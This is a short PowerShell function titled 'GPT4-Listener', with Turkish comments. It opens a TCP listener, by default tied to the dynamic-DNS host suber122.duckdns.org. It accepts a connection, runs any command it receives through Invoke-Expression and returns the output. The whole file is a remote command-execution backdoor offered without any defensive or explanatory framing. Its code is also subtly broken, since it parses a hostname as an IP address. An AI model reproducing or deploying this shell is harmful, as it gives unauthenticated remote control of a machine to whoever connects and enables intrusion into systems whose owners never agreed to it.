function GPT4-Listener {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [int]$Port,
        [Parameter(Mandatory=$False)]
        [string]$IP = "suber122.duckdns.org"
    )

    # IP adresi ve portu bir araya getiriyoruz.
    $endPoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($IP), $Port)

    # Listener'ı başlatıyoruz.
    $listener = New-Object System.Net.Sockets.TcpListener($endPoint)
    $listener.Start()
    
    # Bağlantı bekliyoruz.
    Write-Host "Dinlemede..."
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    
    # Komutları işletiyoruz.
    $reader = New-Object System.IO.StreamReader($stream)
    $command = $reader.ReadToEnd()
    Write-Host "Komut: $command"
    $output = Invoke-Expression $command
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.Write($output)
    $writer.Flush()
    
    # Bağlantıyı kapatıyoruz.
    $client.Close()
    $listener.Stop()
}
